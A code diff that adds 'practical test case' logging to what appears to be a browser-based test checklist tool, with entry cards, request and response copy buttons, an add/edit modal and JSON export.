+          ${breadcrumb ? `<span class="prBreadcrumb">${breadcrumb}</span>` : `<span class="prBreadcrumb prUnlinked">Not linked to a specific test case</span>`}
+          ${statusLabel ? `<span class="badge status-${e.status}">${statusLabel}</span>` : ''}
+          <span class="prTimestamp">${new Date(e.updatedAt).toLocaleString()}</span>
+        </div>
+      </div>
+      <div class="prCardActions">
+        <button class="smallbtn prEditBtn" type="button">✎ Edit</button>
+        <button class="deleteCustomBtn prDeleteBtn" type="button" title="Delete this entry">🗑</button>
+        <button class="expandBtn">▾</button>
+      </div>
+    </div>
+    <div class="prCardBody">
+      <div class="prCardBodyInner">
+        <div class="prBlock">
+          <div class="prBlockHead"><span class="lbl">Request</span><button class="copyBtn" data-copy="request" type="button">⧉ Copy</button></div>
+          <pre class="prPre">${escapeHtml(e.request||'')}</pre>
+        </div>
+        <div class="prBlock">
+          <div class="prBlockHead"><span class="lbl">Response</span><button class="copyBtn" data-copy="response" type="button">⧉ Copy</button></div>
+          <pre class="prPre">${escapeHtml(e.response||'')}</pre>
+        </div>
+        ${e.notes ? `<div class="prNotes"><span class="lbl">Notes</span><div class="prNotesText">${escapeHtml(e.notes)}</div></div>` : ''}
+      </div>
+    </div>
+  `;
+
+  const head = card.querySelector('.prCardHead');
+  const expandBtn = card.querySelector('.expandBtn');
+  head.addEventListener('click', (evt)=>{
+    if(evt.target.closest('.prEditBtn') || evt.target.closest('.prDeleteBtn')) return;
+    card.classList.toggle('open');
+    expandBtn.textContent = card.classList.contains('open') ? '▴' : '▾';
+  });
+  card.querySelector('.prEditBtn').addEventListener('click', (evt)=>{
+    evt.stopPropagation();
+    openPracticalModal(e.id);
+  });
+  card.querySelector('.prDeleteBtn').addEventListener('click', async (evt)=>{
+    evt.stopPropagation();
+    if(!confirm('Delete this practical test case entry? This cannot be undone.')) return;
+    practicalEntries = practicalEntries.filter(x=>x.id!==e.id);
+    await savePractical(currentProjectId, practicalEntries);
+    renderPrList();
+  });
+  card.querySelectorAll('.copyBtn').forEach(btn=>{
+    btn.addEventListener('click', async (evt)=>{
+      evt.stopPropagation();
+      const which = btn.dataset.copy;
+      const text = which==='request' ? (e.request||'') : (e.response||'');
+      try{
+        await navigator.clipboard.writeText(text);
+        const orig = btn.textContent;
+        btn.textContent = '✓ Copied';
+        setTimeout(()=>{ btn.textContent = orig; }, 1200);
+      }catch(err){ /* clipboard access blocked - fail silently */ }
+    });
+  });
+  return card;
+}
+
+function exportPracticalJSON(){
+  const proj = projects.find(p=>p.id===currentProjectId);
+  const exportObj = {project: proj, exportedAt: new Date().toISOString(), practicalTestCases: practicalEntries};
+  const blob = new Blob([JSON.stringify(exportObj, null, 2)], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = (proj.name.replace(/\s+/g,'_')||'project') + '_practical_test_cases.json';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+/* ---- Practical modal: add / edit ---- */
+const prDomainSel = document.getElementById('prDomain');
+const prCategorySel = document.getElementById('prCategory');
+const prTestCaseSel = document.getElementById('prTestCase');
+const PR_NONE = '__none__';
+
+function populatePrDomains(selectedId){
+  prDomainSel.innerHTML = `<option value="${PR_NONE}">— General / not linked —</option>` +
+    DOMAINS.map(d=>`<option value="${d.id}">${d.icon} ${escapeHtml(d.name)}</option>`).join('');
+  prDomainSel.value = selectedId || PR_NONE;
+}
+function populatePrCategories(domainId, selectedId){
+  const wrap = document.getElementById('prCategoryWrap');
+  const testWrap = document.getElementById('prTestCaseWrap');
+  if(domainId === PR_NONE){
+    wrap.classList.add('hide');
+    testWrap.classList.add('hide');
+    return;
+  }
+  wrap.classList.remove('hide');
+  const dom = DOMAINS.find(d=>d.id===domainId);
+  prCategorySel.innerHTML = dom.categories.map(c=>`<option value="${c.id}">${escapeHtml(c.name)}</option>`).join('');
+  prCategorySel.value = selectedId && dom.categories.some(c=>c.id===selectedId) ? selectedId : dom.categories[0].id;
+}
+function populatePrTestCases(domainId, catId, selectedValue){
+  const testWrap = document.getElementById('prTestCaseWrap');
+  if(domainId === PR_NONE){
+    testWrap.classList.add('hide');
+    return;
+  }
+  testWrap.classList.remove('hide');
+  const groups = getFlatTestCases(domainId, catId);
+  let html = `<option value="${PR_NONE}">General (whole category, no specific test)</option>`;
+  groups.forEach(g=>{
+    html += `<optgroup label="${escapeHtml(g.secName)}">`;
+    g.entries.forEach(en=>{
+      html += `<option value="${ctValueFor(en)}">${escapeHtml(en.title)}</option>`;
+    });
+    html += `</optgroup>`;
+  });
+  prTestCaseSel.innerHTML = html;
+  const hasSelected = selectedValue && [...prTestCaseSel.options].some(o=>o.value===selectedValue);
+  prTestCaseSel.value = hasSelected ? selectedValue : PR_NONE;
+}
+
+prDomainSel.addEventListener('change', ()=>{
+  populatePrCategories(prDomainSel.value);
+  populatePrTestCases(prDomainSel.value, prCategorySel.value);
+});
+prCategorySel.addEventListener('change', ()=>{
+  populatePrTestCases(prDomainSel.value, prCategorySel.value);
+});
+
+function openPracticalModal(id){
+  prEditingId = id;
+  const entry = id ? practicalEntries.find(x=>x.id===id) : null;
+  document.getElementById('practicalModalTitle').textContent = entry ? 'Edit Practical Test Case' : 'Log a Practical Test Case';
+
+  populatePrDomains(entry ? entry.domainId : PR_NONE);
+  populatePrCategories(prDomainSel.value, entry ? entry.catId : null);
+  populatePrTestCases(prDomainSel.value, prCategorySel.value, entry ? entry.testRefValue : null);
+
+  document.getElementById('prTitle').value = entry ? entry.title : '';
+  document.getElementById('prStatus').value = entry ? (entry.status||'') : '';
+  document.getElementById('prRequest').value = entry ? entry.request : '';
+  document.getElementById('prResponse').value = entry ? entry.response : '';
+  document.getElementById('prNotes').value = entry ? (entry.notes||'') : '';
+  document.getElementById('prError').classList.remove('show');
+  document.getElementById('practicalModal').classList.add('open');
+}
+function closePracticalModal(){
+  document.getElementById('practicalModal').classList.remove('open');
+  prEditingId = null;
+}
+document.getElementById('practicalClose').addEventListener('click', closePracticalModal);
+document.getElementById('prCancelBtn').addEventListener('click', closePracticalModal);
+document.getElementById('practicalModal').addEventListener('click', (e)=>{
+  if(e.target.id==='practicalModal') closePracticalModal();
+});
+
+document.getElementById('prSaveBtn').addEventListener('click', async ()=>{
+  const errEl = document.getElementById('prError');
+  const title = document.getElementById('prTitle').value.trim();
+  const request = document.getElementById('prRequest').value.trim();
+  const response = document.getElementById('prResponse').value.trim();
+  if(!title || !request || !response){
+    errEl.classList.add('show');
+    return;
+  }
+  errEl.classList.remove('show');
+
+  const domainSelVal = prDomainSel.value;
+  const domainId = domainSelVal === PR_NONE ? null : domainSelVal;
+  const catId = domainId ? prCategorySel.value : null;
+  const status = document.getElementById('prStatus').value;
+  const notes = document.getElementById('prNotes').value.trim();
+  const now = Date.now();
+
+  let secName = null, testTitle = null, testRefValue = null;
+  if(domainId && prTestCaseSel.value && prTestCaseSel.value !== PR_NONE){
+    testRefValue = prTestCaseSel.value;
+    const resolved = resolveCtEntry(domainId, catId, testRefValue);
+    if(resolved){ secName = resolved.secName; testTitle = resolved.title; }
+  }
+
+  if(prEditingId){
+    const idx = practicalEntries.findIndex(x=>x.id===prEditingId);
+    if(idx > -1){
+      practicalEntries[idx] = {
+        ...practicalEntries[idx],
+        title, domainId, catId, secName, testTitle, testRefValue,
+        status, request, response, notes,
+        updatedAt: now
+      };
+    }
+  } else {
+    practicalEntries.push({
+      id: 'pr-' + now + '-' + Math.random().toString(36).slice(2,8),
+      title, domainId, catId, secName, testTitle, testRefValue,
+      status, request, response, notes,
+      createdAt: now, updatedAt: now
+    });
+  }
+
+  await savePractical(currentProjectId, practicalEntries);
+  closePracticalModal();
+  renderPrList();
+});
+
+/* =========================================================
    INIT
 ========================================================= */
 (async function init(){
   await loadProjects();
   currentState = await loadState(currentProjectId);
   customItems = await loadCustomItems(currentProjectId);
+  practicalEntries = await loadPractical(currentProjectId);
   renderProjectList();
   renderDomainTabs();
   renderAll();
